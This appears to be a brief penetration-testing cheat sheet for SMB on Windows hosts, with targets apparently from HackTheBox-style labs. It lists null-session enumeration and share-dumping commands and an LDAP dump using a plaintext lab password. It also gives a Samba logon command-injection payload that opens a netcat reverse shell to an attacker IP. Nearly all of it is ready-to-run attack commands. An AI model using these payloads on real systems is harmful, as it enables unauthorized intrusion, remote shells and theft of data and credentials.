[Windows](Windows)

Checking Null sessions
```bash
smbmap -H 10.10.10.4
smbclient -N -L //10.10.10.4
```

Creating reverse shell
```bash
smbclient //10.10.10.3/tmp
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
```

```bash
smbmap -H <remote_ip> -u <username> -p <password>
```

```bash
smbclient //10.10.10.100/<share_name> -U ""%""
    RECURSE ON
    PROMPT OFF
    mget *
```

```bash
nxc smb 10.10.11.35 -u guest -p '' --shares
```

```bash
ldapdomaindump -u cicada.htb\\michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35 -o ldapdump
```

https://github.com/abatchy17/WindowsExploits